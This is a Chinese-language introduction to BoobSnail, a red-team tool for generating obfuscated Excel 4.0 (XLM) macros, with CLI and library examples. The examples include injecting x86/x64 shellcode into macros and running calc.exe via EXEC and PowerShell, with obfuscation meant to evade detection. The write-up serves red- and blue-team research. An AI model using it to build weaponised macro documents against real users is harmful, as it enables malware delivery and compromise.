## 关于BoobSnail

BoobSnail可以帮助广大研究人员生成XLM（Excel
4.0）宏文件，该工具可以在XLM宏生成任务中给红队和蓝队研究人员提供帮助。该工具支持的功能如下：

> 各种感染技术；
>
> 各种代码混淆技术；
>
> 将公式翻译成英语以外的语言；
>
> 可当作代码库使用，以便研究人员编写自己的生成器；

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/STMCyber/boobsnail.git

## 工具依赖

BoobSnail基于Python 3开发，因此我们需要在本地设备上安装并配置好Python

3.8.7rc1环境。接下来，运行下列命令安装该工具所需依赖组件：

    
    
    pip install -r requirements.txt
    
    python boobsnail.py
    
    ___.                ___.     _________             .__.__
    
    \_ |__   ____   ____\_ |__  /   _____/ ____ _____  |__|  |
    
     | __ \ /  _ \ /  _ \| __ \ \_____  \ /    \__  \ |  |  |
    
     | \_\ (  <_> |  <_> ) \_\ \/        \   |  \/ __ \|  |  |__
    
     |___  /\____/ \____/|___  /_______  /___|  (____  /__|____/
    
         \/                  \/        \/     \/     \/
    
         Author: @_mzer0 @stm_cyber
    
         (...)

## 工具使用

    
    
    python boobsnail.py <generator> -h

显示可用的生成器类型：

    
    
    python boobsnail.py

## 工具使用样例

生成注入了x64或x86 Shellcode的经过代码混淆处理的宏：

    
    
    python boobsnail.py Excel4NtDonutGenerator --inputx86 <PATH_TO_SHELLCODE> --inputx64 <PATH_TO_SHELLCODE> --out boobsnail.csv

生成能够运行calc.exe的经过代码混淆处理的宏：

    
    
    python boobsnail.py Excel4ExecGenerator --cmd "powershell.exe -c calc.exe" --out boobsnail.csv

## 代码库使用

BoobSnail使用了excel4lib库来支持创建我们自己的Excel4宏生成器。excel4lib库包含了几个类，可以在创建生成器的过程中使用：

  * macro.Excel4Macro：允许定义Excel4公式和变量值；
  * macro.obfuscator.Excel4Obfuscator：允许对Excel4宏中的指令代码进行混淆处理；
  * lang.Excel4Translator：允许将公式转译为其他语言；

 **下面给出的例子中将创建一个能够运行calc.exe的简单宏：**

    
    
    from excel4lib.macro import *
    
    # Create macro object
    
    macro = Excel4Macro("test.csv")
    
    # Add variable called cmd with value "calc.exe" to the worksheet
    
    cmd = macro.variable("cmd", "calc.exe")
    
    # Add EXEC formula with argument cmd
    
    macro.formula("EXEC", cmd)
    
    # Dump to CSV
    
    print(macro.to_csv())

 **结果如下：**

    
    
    cmd="calc.exe";
    
    =EXEC(cmd);

 **如果你想对宏进行混淆处理，则需要导入混淆工具并传递给Excel4Macro对象：**

    
    
    from excel4lib.macro import *
    
    from excel4lib.macro.obfuscator import *
    
    # Create macro object
    
    macro = Excel4Macro("test.csv", obfuscator=Excel4Obfuscator())
    
    # Add variable called cmd with value "calc.exe" to the worksheet
    
    cmd = macro.variable("cmd", "calc.exe")
    
    # Add EXEC formula with argument cmd
    
    macro.formula("EXEC", cmd)
    
    # Dump to CSV
    
    print(macro.to_csv())

**如需将你的宏转译为其他语言，假设为波兰语（当前该工具仅支持英语和波兰语），我们则需要导入Excel4Translator类，并调用set_language方法：**

    
    
    from excel4lib.macro import *
    
    from excel4lib.lang.excel4_translator import *
    
    # Change language
    
    Excel4Translator.set_language("pl_PL")
    
    # Create macro object
    
    macro = Excel4Macro("test.csv", obfuscator=Excel4Obfuscator())
    
    # Add variable called cmd with value "calc.exe" to the worksheet
    
    cmd = macro.variable("cmd", "calc.exe")
    
    # Add EXEC formula with argument cmd
    
    macro.formula("EXEC", cmd)
    
    # Dump to CSV
    
    print(macro.to_csv())

 **结果如下：**

    
    
    cmd="calc.exe";
    
    =URUCHOM.PROGRAM(cmd);

 **如果你需要创建一个能将其他公式作为接收参数的公式，则需要使用Excel4Macro.argument函数：**

    
    
    from excel4lib.macro import *
    
    macro = Excel4Macro("test.csv")  
    # Add variable called cmd with value "calc" to the worksheet
    
    cmd_1 = macro.variable("cmd", "calc")
    
    # Add cell containing .exe as value
    
    cmd_2 = macro.value(".exe")
    
    # Create CONCATENATE formula that CONCATENATEs cmd_1 and cmd_2
    
    exec_arg = macro.argument("CONCATENATE", cmd_1, cmd_2)
    
    macro.formula("EXEC", exec_arg)
    
    # Dump to CSV
    
    print(macro.to_csv())

 **结果如下：**

    
    
    cmd="calc";
    
    .exe;
    
    =EXEC(CONCATENATE(cmd,R2C1));

## 项目地址

 **BoobSnail：** 【[ _GitHub传送门_](https://github.com/STMCyber/boobsnail)】

## 参考资料

> [ _https://blog.stmcyber.com/excel-4-0-for-red-> team/_](https://blog.stmcyber.com/excel-4-0-for-red-team/)
>
> [ _https://blog.stmcyber.com/boobsnail-excel-4-0-macro-> generator/_](https://blog.stmcyber.com/boobsnail-excel-4-0-macro-generator/)

